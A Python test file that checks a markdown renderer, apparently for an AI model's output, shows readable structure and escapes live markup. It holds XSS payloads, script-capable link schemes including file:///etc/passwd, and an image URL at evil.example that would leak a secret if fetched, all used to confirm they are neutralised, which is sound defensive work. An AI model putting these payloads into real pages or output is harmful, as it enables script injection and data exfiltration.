"""Assistant Markdown renders readable structure and never live markup."""

from html.parser import HTMLParser

import pytest

from kerkov.web.runtime.markdown_html import render_markdown


class _Elements(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.elements: list[tuple[str, dict[str, str]]] = []

    def handle_starttag(self, tag, attrs):
        self.elements.append((tag, {name: value or "" for name, value in attrs}))


def _elements(markdown):
    parser = _Elements()
    parser.feed(render_markdown(markdown))
    return parser.elements


def _tags(markdown):
    return {tag for tag, _ in _elements(markdown)}


def test_common_markdown_structure_renders():
    tags = _tags(
        "# Title\n\n## Section\n\n**bold** _em_ `code` ~~old~~\n\n"
        "- one\n- two\n\n1. first\n\n> quoted\n\n"
        "```bash\nnmap -sV 10.0.0.1\n```\n\n"
        "| port | service |\n|---|---|\n| 22 | ssh |\n\n"
        "[docs](https://kerkov.me/docs)"
    )
    assert {"h1", "h2", "strong", "em", "code", "s", "ul", "ol", "li"} <= tags
    assert {"blockquote", "pre", "table", "th", "td", "a"} <= tags


def test_single_newlines_stay_visible_as_breaks():
    assert render_markdown("Target: 10.0.0.1\nPort: 22") == (
        "<p>Target: 10.0.0.1<br />\nPort: 22</p>\n"
    )


def test_links_open_in_a_new_tab_without_referrer():
    [link] = [
        a for tag, a in _elements("[report](https://example.com/report)") if tag == "a"
    ]
    assert link == {
        "href": "https://example.com/report",
        "target": "_blank",
        "rel": "noopener noreferrer",
    }


@pytest.mark.parametrize(
    "markdown",
    [
        "<script>window.injected = true</script>",
        '<img src=x onerror="window.injected = true">',
        '<div onclick="approve()">\nblock\n</div>',
        'inline <span onmouseover="approve()">html</span>',
        "<iframe src=https://evil.example></iframe>",
        '```" onmouseover="approve()\nbody\n```',
    ],
)
def test_raw_html_and_attribute_injection_are_escaped(markdown):
    elements = _elements(markdown)
    assert {tag for tag, _ in elements} <= {"p", "br", "pre", "code"}
    assert not any(name.startswith("on") for _, a in elements for name in a)


@pytest.mark.parametrize(
    "markdown",
    [
        "[x](javascript:approve())",
        "[x](JaVaScRiPt:approve())",
        "[x](&#106;avascript:approve())",
        "[x](vbscript:approve())",
        "[x](file:///etc/passwd)",
        "[x](data:text/html,<script>approve()</script>)",
        "<javascript:approve()>",
        "[x]\n\n[x]: javascript:approve()",
    ],
)
def test_script_capable_link_schemes_are_not_linked(markdown):
    assert "a" not in _tags(markdown)


def test_images_are_never_fetched_automatically():
    elements = _elements("![status](https://evil.example/pixel?secret=hunter2)")
    assert "img" not in {tag for tag, _ in elements}
    assert elements == [
        ("p", {}),
        (
            "a",
            {
                "href": "https://evil.example/pixel?secret=hunter2",
                "target": "_blank",
                "rel": "noopener noreferrer",
            },
        ),
    ]
